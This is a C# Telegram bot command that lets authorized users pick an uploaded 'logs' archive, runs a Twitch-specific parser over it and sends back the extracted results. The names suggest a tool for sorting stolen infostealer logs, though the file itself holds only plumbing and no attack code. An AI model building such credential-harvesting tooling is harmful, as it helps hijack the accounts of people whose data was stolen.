using Core.Parsers.Services;
using TelegramBot.Extensions;
using TelegramBot.Models;
using TelegramBot.Services;
using TL;
using WTelegram;

namespace TelegramBot.Commands.Services;

public class TwitchServiceCommand(Client client, DataService data) : ICommand, ICallbackCommand
{
    public bool AuthorizedOnly { get; } = true;

    Task ICommand.Invoke(UpdateNewMessage update, User user) =>
        client.SendMessageAvailableLogs(user, "Twitch", data);
    
    // ◀️▶️
    async Task ICallbackCommand.Invoke(UpdateBotCallbackQuery update, User user)
    {
        if (await client.SendCallbackAvailableLogsOrGetPath(user, data, update.msg_id, update.data) is not
            { } logsname) return;

        string logs = data.GetExtractedPath(logsname);

        await client.EditMessage(user, update.msg_id, $"Telegram\nParsing from {logsname}");

        string filepath = await data.SaveAsync(
            logsname,
            logs.TwitchFromLogs(),
            "Twitch");

        await data.SendFileAsync(user, filepath);
    }
}